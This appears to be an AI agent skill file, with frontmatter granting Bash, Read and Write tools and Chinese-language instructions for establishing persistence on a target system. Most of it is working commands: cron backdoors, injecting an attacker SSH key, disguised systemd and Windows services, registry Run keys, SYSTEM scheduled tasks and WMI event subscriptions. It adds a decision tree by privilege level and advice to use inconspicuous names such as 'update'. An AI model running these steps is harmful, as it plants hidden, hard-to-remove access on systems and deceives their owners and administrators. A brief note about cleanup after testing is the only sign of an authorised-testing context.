---
name: persistence
description: 持久化方法论（cron/service/registry）
when_to_use: 当需要在目标上建立持久化访问时
allowed-tools: [Bash, Read, Write]
argument-hint: "<linux|windows>"
arguments: [os]
user-invocable: true
context: inline
---

## 持久化

### Linux 持久化

#### Cron 任务

```bash
# 用户级 cron
(crontab -l 2>/dev/null; echo "* * * * * /tmp/.backdoor") | crontab -

# 系统级 cron
echo "* * * * * root /tmp/.backdoor" >> /etc/cron.d/update
```

#### SSH 密钥

```bash
# 添加攻击者公钥
echo "<attacker_pubkey>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

#### Systemd 服务

```bash
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service

[Service]
ExecStart=/opt/.update
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable update.service
systemctl start update.service
```

#### Bashrc/Profile

```bash
echo '/opt/.update &' >> ~/.bashrc
echo '/opt/.update &' >> /etc/profile
```

### Windows 持久化

#### 注册表 Run Key

```bash
# 当前用户
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Users\Public\update.exe"

# 所有用户（需要 admin）
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\update.exe"
```

#### 计划任务

```bash
# 创建计划任务
schtasks /create /tn "SystemUpdate" /tr "C:\Users\Public\update.exe" /sc onlogon /ru SYSTEM

# 每小时执行
schtasks /create /tn "Maintenance" /tr "C:\Users\Public\update.exe" /sc hourly /mo 1
```

#### 服务

```bash
# 创建服务
sc create "WindowsUpdate" binpath= "C:\Users\Public\update.exe" start= auto
sc start "WindowsUpdate"
```

#### WMI 事件订阅

```bash
# PowerShell WMI 持久化
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "UpdateFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
```

### 决策树

```
目标系统
  ├── Linux
  │     ├── 有 root → systemd 服务（最稳定）
  │     ├── 有 root → cron + SSH key
  │     └── 普通用户 → 用户 cron + bashrc
  ├── Windows
  │     ├── 有 SYSTEM → 服务 + WMI 事件
  │     ├── 有 admin → 计划任务 + HKLM Run
  │     └── 普通用户 → HKCU Run + 用户计划任务
  └── 通用
        └── 多种方式组合，避免单点失败
```

### 注意事项

- 记录所有持久化操作（清理时需要）
- 使用不显眼的名称（update, maintenance, svc）
- 测试完成后必须清理所有持久化
